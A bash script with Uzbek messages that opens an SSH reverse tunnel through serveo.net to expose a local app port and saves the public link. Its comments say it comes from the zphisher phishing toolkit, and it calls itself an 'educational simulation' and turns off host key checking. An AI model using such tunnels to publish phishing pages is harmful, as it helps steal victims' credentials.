#!/usr/bin/env bash
# Serveo.net SSH tunnel (zphisher start_serveo dan)

source "$(dirname "$0")/lib.sh"

stop_tunnel
mkdir -p "$DATA_DIR"

if ! command -v ssh >/dev/null 2>&1; then
  error "SSH o'rnatilmagan. O'rnating: pkg install openssh"
fi

info "Serveo tunnel ishga tushirilmoqda (port $APP_PORT)..."
rm -f "$LINK_FILE"

# zphisher: ssh -R 80:localhost:PORT serveo.net
nohup ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
  -R "80:localhost:${APP_PORT}" serveo.net > "$LINK_FILE" 2>&1 &
echo $! > "$TUNNEL_PID_FILE"

info "Serveo ulanmoqda (7-15 soniya)..."
sleep 10

LINK=$(grep -oE 'https://[0-9a-zA-Z.-]+\.serveo\.net' "$LINK_FILE" 2>/dev/null | head -n1 || true)

if [ -z "$LINK" ]; then
  LINK=$(grep -oE 'https://[^ ]+' "$LINK_FILE" 2>/dev/null | head -n1 || true)
fi

if [ -z "$LINK" ]; then
  warn "Serveo havolasi olinmadi. Qayta urinib ko'ring yoki ngrok tanlang."
  cat "$LINK_FILE" 2>/dev/null || true
  exit 1
fi

save_public_url "$LINK" "serveo"
echo ""
ok "Ta'lim simulyatsiyasi uchun ommaviy havola (Serveo):"
echo -e "  \033[1;93m$LINK\033[0m"
